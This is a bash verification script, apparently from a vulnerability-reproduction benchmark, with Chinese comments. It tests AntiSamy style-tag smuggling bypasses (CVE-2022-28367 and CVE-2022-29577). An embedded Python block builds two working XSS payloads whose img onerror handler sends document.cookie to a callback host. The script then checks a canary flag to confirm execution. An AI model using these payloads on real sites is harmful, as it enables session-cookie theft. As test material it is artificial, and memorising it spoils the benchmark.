#!/usr/bin/env bash
# PCBV2-0066 antisamy_style_smuggling — 手写定制 verify.sh
# CVE-2022-28367 (v0 AntiSamy 1.6.5: processStyleTag 只扫 firstChild, smuggled 子节点原样输出)
#   -> v1 1.6.6 部分修复 = TARGET (拼接子文本+前向移除循环) -> CVE-2022-29577 (v2 1.6.7 反向循环全删).
# 同 sink: new AntiSamy().scan(html, antisamy.xml, DOM).getCleanHTML(), 浏览器解析净化后输出.
# flag 通道 = canary: victim 容器以 ${PCB_FLAG} 种入浏览器 cookie, XSS 执行后 exfil 到 callback /dump.
#   判定用 RUN_FLAG(提交值): wrong/stale 检查时容器内是真 flag 而提交值不同 -> 判定失败(符合预期).
# seed     = 单 smuggled child(node idx1) -> v0 残留执行(rc0); v1 前向移除循环删除 -> 未发生(rc10)
# residual = 多 smuggled child(<b></b> 把危险节点推到偶数索引) -> v1 前向循环跳过偶数节点残留执行(rc0);
#            v2 反向循环全删 -> 未发生.
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
  echo "status=rejected(wrong/stale flag)"
  exit 10
fi
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
# canary 通道: 判定基准 = 提交值 RUN_FLAG
JUDGE_FLAG="$RUN_FLAG"

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

# --- 就绪: app /health + victim /health + callback /health (端口动态解析) ---
APP_PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
VICTIM_PORT="$(dc port victim 8070 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
CB_PORT="$(dc port callback 9000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$APP_PORT" || -z "$VICTIM_PORT" || -z "$CB_PORT" ]]; then
  echo "verify: 无法解析 compose 端口 app=$APP_PORT victim=$VICTIM_PORT callback=$CB_PORT" >&2
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"
export PCB_VICTIM_PORT="$VICTIM_PORT"
export PCB_CALLBACK_PORT="$CB_PORT"
ready=0
for _ in $(seq 1 100); do
  if curl -fsS "http://127.0.0.1:${APP_PORT}/health" >/dev/null 2>&1 \
     && curl -fsS "http://127.0.0.1:${VICTIM_PORT}/health" >/dev/null 2>&1 \
     && curl -fsS "http://127.0.0.1:${CB_PORT}/health" >/dev/null 2>&1; then
    ready=1; break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then echo "verify: readiness 超时 (app/victim/callback)" >&2; exit 20; fi

# --- 构造 candidate: seed=单 smuggled child, residual=多 smuggled child (与 poc_common.CB 通道一致) ---
"$PY" - "$MODE" "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
mode, out = sys.argv[1], sys.argv[2]
CB = "//callback:9000/c?f="
onerr = "document.location='" + CB + "'+document.cookie"
if mode == "--seed":
    # CVE-2022-28367 seed: 单个 smuggled child (child index 1) -> 1.6.6 移除循环删除
    payload = "<style/>b<![cdata[</style><img src=x onerror=\"" + onerr + "\">"
else:
    # CVE-2022-29577 residual: <b></b> 占位把危险节点推到 EVEN child index -> 1.6.6 前向移除循环跳过
    payload = "<style/>a<b></b><![cdata[</style><img src=x onerror=\"" + onerr + "\">"
json.dump({"payload": payload, "mode": "load"}, open(out, "w"))
PYEOF

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# --- 执行: seed_exec.py 需要 PYTHONPATH 才能 import case 根的 poc_common ---
export PYTHONPATH="${PYTHONPATH:+$PYTHONPATH:}$CASE_DIR"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "verify: seed_exec 执行失败" >&2; printf '%s\n' "$OUT" >&2; exit 20; }
echo "verify: ${VERSION} ${MODE} dump=$(printf '%s' "$OUT" | head -c 400)"

# --- 判定: canary 通道, flag 出现在 callback dump 即 JS 执行 -> 效果发生 ---
if grep -qF "$JUDGE_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
